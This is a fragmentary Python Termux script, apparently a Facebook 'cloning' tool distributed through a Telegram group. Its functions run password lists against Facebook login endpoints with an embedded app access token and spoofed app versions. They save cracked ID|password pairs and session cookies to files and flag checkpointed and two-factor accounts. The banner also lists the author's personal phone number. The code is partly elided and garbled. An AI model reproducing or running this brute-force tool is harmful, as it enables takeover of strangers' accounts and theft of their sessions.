...
\033[1;36m               ╲ ╲▏╭╮▕╱ ╱      
        ...
        \033[1;37m          ▏▏▕▕
           \033[1;33m       ▏▏▕▕
      \033[1;36m           ╭╰ ╮╭╰ ╮
   \033[1;34m     Adnan_Always_On_Fire
●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●๑۩♡۩๑●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
...
https://t.me/+PCHk9_nDCMM3NDI1

🌺 Unlimited Termux Script Gift Deya Hoy 💝 

All Join Hou 😤

┏━━━━━━━━━━━━━━━━━━━𝑨𝒅𝒏𝒂𝒏_𝑨𝒍𝒘𝒂𝒚𝒔_𝑶𝒏_𝑭𝒊𝒓𝒆━━━━━━━━━━━━━━━━━━━━━┓
     ┃ ❣︎[𖣘]☔︎𝙉𝘼𝙈𝙀        : [★] 𝐀𝐝𝐧𝐚𝐧 𝐀𝐡𝐦𝐞𝐝             ┃
     ┃ ❣︎[𖣘]☔︎𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆    : [★] 𝐀𝐝𝐧𝐚𝐧 𝐀𝐡𝐦𝐞𝐝    ┃                                                           ┃ ❣︎[𖣘]☔︎𝙂𝙄𝙏𝙃𝙐𝘽      : [★] Adnan78789898          ┃
     ┃ ❣︎[𖣘]☔︎𝙍𝙄𝙇𝙄𝙂𝙀𝙎𝙃𝙊𝙉  : [★]𝗕𝗔𝗡𝗚𝗟𝗔𝗗𝗘𝗦𝗛𝗜        ┃
     ┃ ❣︎[𖣘]☔︎𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋    : [★]+8801790666369     ┃
     ┃ ❣︎[𖣘]☔︎𝙏𝙊𝙊𝙇𝙎 𝙉𝘼𝙈𝙀  : [★]𝗥𝟰𝗡𝗗𝗢𝗡-𝗖𝗟𝗢𝗡𝗜𝗡𝗚     ┃
     ┃ ❣︎[𖣘]☔︎𝙏𝙊𝙊𝙇𝙎 𝙎𝙏𝘼𝙏𝙐𝙎: [★]free & Enjoy               ┃
     ┗━━━━━━━━━━━━━━━━━━━𝑨𝒅𝒏𝒂𝒏_𝑨𝒍𝒘𝒂𝒚𝒔_𝑶𝒏_𝑭𝒊𝒓𝒆━━━━━━━━━━━━━━━━━━━━┛
\033[1;31m All  Telegram Serch →→Termux Script Gift 
""")
def linex():
	print('\033[1;37m--------------------------------------------------')
def clear():
...
def menu():
		...
		#	linex()
			...
			os.system('https://t.me/+PCHk9_nDCMM3NDI1')
			if xd in ['1','01']:
				clear()
...
def api1(ids,names,passlist):
		try:
			global ok,loop
			sys.stdout.write('\r\r\033[1;37m [𝐀𝐝𝐧𝐚𝐧_𝐊𝐢𝐧𝐠-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
			fn = names.split(' ')[0]
			try:
				ln = names.split(' ')[1]
			except:
			...
			for pw in passlist:
				...
				q = json.loads(po)
				if 'session_key' in q:
					print('\r\r\033[1;32m [𝐀𝐝𝐧𝐚𝐧_𝐊𝐢𝐧𝐠-OK] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/𝐀𝐝𝐧𝐚𝐧_𝐊𝐢𝐧𝐠-OK.txt','a').write(ids+'|'+pas+'\n')
					oks.append(ids)
					break
				elif 'www.facebook.com' in q['error_msg']:
					if 'y' in pcp:
						print('\r\r\x1b[38;5;205m [ZEESHU-CP] '+ids+' | '+pas+'\033[1;97m')
						open('/sdcard/𝐀𝐝𝐧𝐚𝐧_𝐊𝐢𝐧𝐠-CP.txt','a').write(ids+'|'+pas+'\n')
						cps.append(ids)
						break
					else:
						open('/sdcard/𝐀𝐝𝐧𝐚𝐧_𝐊𝐢𝐧𝐠-CP.txt','a').write(ids+'|'+pas+'\n')
...
def api2(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [𝐀𝐝𝐧𝐚𝐧_𝐊𝐢𝐧𝐠-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        open('/sdcard/𝐀𝐝𝐧𝐚𝐧_𝐊𝐢𝐧𝐠-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/𝐀𝐝𝐧𝐚𝐧_𝐊𝐢𝐧𝐠-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[𝐀𝐝𝐧𝐚𝐧_𝐊𝐢𝐧𝐠-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;205m [𝐀𝐝𝐧𝐚𝐧_𝐊𝐢𝐧𝐠-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/𝐀𝐝𝐧𝐚𝐧_𝐊𝐢𝐧𝐠-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/ZEESHU-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                        continue
...
#method4
os.system("xdg-open https://t.me/+PCHk9_nDCMM3NDI1/")
def ZEESHU4(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [𝐀𝐝𝐧𝐚𝐧_𝐊𝐢𝐧𝐠-M1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [𝐀𝐝𝐧𝐚𝐧_𝐊𝐢𝐧𝐠-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print('\033[1;32m [\033[1;37mBISCUIT\033[1;32m]\033[1;37m '+coki)
                                        open('/sdcard/ZEESHU-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/ZEESHU-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\033[1;33m [𝐀𝐝𝐧𝐚𝐧_𝐊𝐢𝐧𝐠-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ZEESHU-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
